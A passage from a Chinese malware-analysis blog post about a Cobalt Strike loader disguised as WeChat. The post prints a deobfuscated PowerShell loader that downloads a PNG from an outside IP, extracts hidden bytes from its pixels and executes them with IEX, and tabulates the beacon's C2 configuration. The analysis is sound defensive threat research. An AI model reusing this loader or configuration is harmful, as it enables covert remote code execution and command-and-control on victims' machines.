class="hljs-built_in">New-Object</span>;<br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.Drawing;<br><span class="hljs-variable">$g</span> = a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="hljs-string">&quot;http://121.37.221.98:11111/121.png&quot;</span>));<br><br><span class="hljs-comment"># 初始化字节数组用于存储隐写数据</span><br><span class="hljs-variable">$o</span> = a Byte[] <span class="hljs-number">3840</span>;<br><br><span class="hljs-comment"># 从图片像素中提取隐藏数据（每像素2字节，共1920x2=3840字节）</span><br>(<span class="hljs-number">0</span>..<span class="hljs-number">1</span>) | %&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>..<span class="hljs-number">1919</span>)) &#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable">$g</span>.GetPixel(<span class="hljs-variable">$x</span>, <span class="hljs-variable">$_</span>);<br>        <span class="hljs-variable">$o</span>[<span class="hljs-variable">$_</span> * <span class="hljs-number">1920</span> + <span class="hljs-variable">$x</span>] = ([<span class="hljs-type">math</span>]::Floor((<span class="hljs-variable">$p</span>.B <span class="hljs-operator">-band</span> <span class="hljs-number">15</span>) * <span class="hljs-number">16</span>) <span class="hljs-operator">-bor</span> (<span class="hljs-variable">$p</span>.G <span class="hljs-operator">-band</span> <span class="hljs-number">15</span>));<br>    &#125;<br>&#125;;<br><br><span class="hljs-built_in">Set-Variable</span> <span class="hljs-string">&#x27;6M4&#x27;</span> ([<span class="hljs-type">System.Text.Encoding</span>]);<br><br><span class="hljs-comment"># 将提取的字节数组解码为字符串并执行</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-variable">$6M4::ASCII</span>.GetString(<span class="hljs-variable">$o</span>[<span class="hljs-number">0</span><span class="hljs-type">..3598</span>]));<br></code></pre></td></tr></table></figure>
+
+<p>下载图像之后，二阶段shellcode脚本特征，下载beacon，Base64 编码 → XOR 解密 → 再次 Base64 解码。</p>
+<p>提取的CS配置文件：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Version</strong></td>
+<td><code>4.6</code></td>
+<td>Cobalt Strike 版本号</td>
+</tr>
+<tr>
+<td><strong>Socket Port</strong></td>
+<td><code>11443</code></td>
+<td>C2 通信端口（HTTPS）</td>
+</tr>
+<tr>
+<td><strong>Interval</strong></td>
+<td><code>60</code> 秒</td>
+<td>心跳间隔，每 60 秒回连一次</td>
+</tr>
+<tr>
+<td><strong>URL</strong></td>
+<td><code>https://121.37.221.98/load</code></td>
+<td>C2 服务器主地址</td>
+</tr>
+<tr>
+<td><strong>User-Agent</strong></td>
+<td><code>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MDDRJS)</code></td>
+<td>伪装成旧版 IE 浏览器</td>
+</tr>
+<tr>
+<td><strong>Beacon Type</strong></td>
+<td><code>HTTPS</code></td>
+<td>使用加密 HTTPS 通道</td>
+</tr>
+<tr>
+<td><strong>MaxGetSize</strong></td>
+<td><code>1048576</code></td>
+<td>最大 GET 请求大小（1MB）</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Encryption Key</strong></td>
+<td><code>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDf+Q1bBhu6OnW+G1vfTY1dZ+gn5s27t0zMyJ2Xg0LO2FGXL1ghBbss97vsHYKdIV+O+OHcZCfQ8znW4GFGiYmcggQSnli2qaCD5pghicSg7SHfYSZc7PD8qBUwL0SSwAEJCgUDwvAg+uY+6FWcCatimdxG9XymEuaF7lG7Um+bjwIDAQAB</code></td>
+<td><strong>RSA 公钥</strong>，用于加密通信</td>
+</tr>
+<tr>
+<td><strong>Watermark</strong></td>
+<td><code>987654321</code></td>
+<td>Cobalt Strike 授权水印，可识别团队服务器</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>HttpPostUri</strong></td>
+<td><code>/submit.php</code></td>
+<td>数据回传路径（POST 请求）</td>
+</tr>
+<tr>
+<td><strong>HTTPGetClient</strong></td>
+<td><code>base64</code></td>
+<td>GET 请求参数使用 base64 编码</td>
+</tr>
+<tr>
+<td><strong>HTTPPostClient</strong></td>
+<td><code>print, parameter &quot;id&quot;, header Content-Type: application/octet-stream</code></td>
+<td>POST 数据通过 <code>id</code> 参数发送，伪装成二进制流</td>
+</tr>
+<tr>
+<td><strong>HTTPGet_Verb</strong></td>
+<td><code>GET</code></td>
+<td>任务获取方式</td>
+</tr>
+<tr>
+<td><strong>HTTPPost_Verb</strong></td>
+<td><code>POST</code></td>
+<td>数据回传方式</td>
+</tr>
+<tr>
+<td><strong>Proxy_Behavior</strong></td>
+<td><code>Use IE settings</code></td>
+<td>使用系统 IE 代理设置</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>spawnto_x64</strong></td>
+<td><code>%windir%\\sysnative\\rundll32.exe</code></td>
+<td>64 位注入目标进程</td>
+</tr>
+<tr>
+<td><strong>spawnto_x86</strong></td>
+<td><code>%windir%\\syswow64\\rundll32.exe</code></td>
+<td>32 位注入目标进程</td>
+</tr>
+<tr>
+<td><strong>ProcInject_Execute</strong></td>
+<td><code>CreateThread, SetThreadContext, CreateRemoteThread, RtlCreateUserThread</code></td>
+<td>支持的注入技术</td>
+</tr>
+<tr>
+<td><strong>ProcInject_AllocationMethod</strong></td>
+<td><code>VirtualAllocEx</code></td>
+<td>内存分配方式</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Malware/" class="category-chain-item">Malware</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" class="print-no-link">#主机安全</a>
+      
+        <a href="/tags/CobaltStrike/" class="print-no-link">#CobaltStrike</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>国护红队新活？伪装成微信的CS 图像隐写术loader分析</div>
+      <div>http://example.com/2025/07/24/国护红队新活？伪装成微信的CS-图像隐写术loader分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Jentle</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 24, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/09/03/windows%E7%BB%BC%E5%90%88%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/" title="windows综合内核调试技术">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">windows综合内核调试技术</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/15/%E5%9B%BD%E6%8A%A4%E6%9C%9F%E9%97%B4%E6%9F%90%E9%80%9A%E4%BF%A1%E5%85%AC%E5%8F%B8%E7%9A%84%E7%99%BD%E5%8A%A0%E9%BB%91%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" title="国护期间某通信公司的白加黑样本分析">
+                        <span class="hidden-mobile">国护期间某通信公司的白加黑样本分析</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Hipepper/UtterancBlog');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Hipepper" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://mp.weixin.qq.com/s/WZSeu6y5ckuo958f-yV3Kg" target="_blank" rel="nofollow noopener"><span>公众号</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
